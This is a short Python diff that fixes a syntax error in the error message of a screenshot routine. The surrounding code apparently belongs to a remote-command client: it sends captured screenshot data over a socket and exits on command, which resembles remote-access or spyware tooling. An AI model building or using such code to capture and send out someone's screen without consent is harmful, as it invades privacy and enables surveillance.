@@ -54,7 +54,7 @@ try:
                   data = img_file.read()
                   client.sendall(data)
            except Exception as e:
-                 print("Error capturing screenshot:", str(e)")
+                 print("Error capturing screenshot:", str(e))
             
         elif command == 'exit':
             sys.exit()  
